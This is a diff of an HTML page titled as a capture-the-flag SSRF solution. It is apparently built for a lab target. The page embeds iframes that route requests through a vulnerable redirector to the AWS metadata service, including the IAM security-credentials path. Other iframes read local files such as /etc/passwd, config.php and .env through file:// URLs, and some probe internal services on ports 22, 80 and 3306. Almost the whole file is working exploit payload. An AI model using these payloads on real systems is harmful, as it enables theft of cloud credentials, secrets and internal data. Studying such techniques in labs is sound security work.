@@ -1,27 +1,59 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CTF SSRF Solution</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .target { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
+        h3 { color: #333; margin: 5px 0; }
+        iframe { border: 1px solid #666; margin: 5px 0; }
+    </style>
+</head>
 <body>
-<h3>SSRF Iframe Test</h3>
-
-<!-- Test AWS metadata -->
-<h4>AWS Token Request:</h4>
-<iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/api/token" width="800" height="200"></iframe>
-
-<h4>AWS Metadata:</h4>
-<iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/" width="800" height="200"></iframe>
-
-<h4>AWS Credentials:</h4>
-<iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="800" height="200"></iframe>
-
-<!-- Test local files -->
-<h4>Flag File Test:</h4>
-<iframe src="http://localhost/redir.php?url=file:///flag.txt" width="800" height="200"></iframe>
-<iframe src="http://localhost/redir.php?url=file:///var/flag.txt" width="800" height="200"></iframe>
-<iframe src="http://localhost/redir.php?url=file:///home/flag.txt" width="800" height="200"></iframe>
-
-<!-- Test internal services -->
-<h4>Internal Services:</h4>
-<iframe src="http://localhost/redir.php?url=http://127.0.0.1:80" width="800" height="200"></iframe>
-<iframe src="http://localhost/redir.php?url=http://localhost:3306" width="800" height="200"></iframe>
+    <h1>SSRF Exploitation via CORS Redirector</h1>
+    
+    <!-- AWS Metadata Service -->
+    <div class="target">
+        <h3>1. AWS Metadata Service</h3>
+        <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/" width="100%" height="300"></iframe>
+    </div>
+    
+    <!-- AWS Security Credentials -->
+    <div class="target">
+        <h3>2. AWS IAM Security Credentials</h3>
+        <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
+    </div>
+    
+    <!-- Common Flag Locations -->
+    <div class="target">
+        <h3>3. Flag File Attempts</h3>
+        <iframe src="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///var/flag.txt" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///home/flag.txt" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///root/flag.txt" width="100%" height="150"></iframe>
+    </div>
+    
+    <!-- System Files for Confirmation -->
+    <div class="target">
+        <h3>4. System Files (Confirmation)</h3>
+        <iframe src="http://localhost/redir.php?url=file:///etc/passwd" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///etc/hostname" width="100%" height="100"></iframe>
+    </div>
+    
+    <!-- Internal Services -->
+    <div class="target">
+        <h3>5. Internal Services</h3>
+        <iframe src="http://localhost/redir.php?url=http://127.0.0.1:80/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost:22/" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost:3306/" width="100%" height="150"></iframe>
+    </div>
+    
+    <!-- Application Files -->
+    <div class="target">
+        <h3>6. Application Files</h3>
+        <iframe src="http://localhost/redir.php?url=file:///var/www/html/index.php" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///var/www/html/config.php" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=file:///var/www/html/.env" width="100%" height="150"></iframe>
+    </div>
 </body>
 </html>
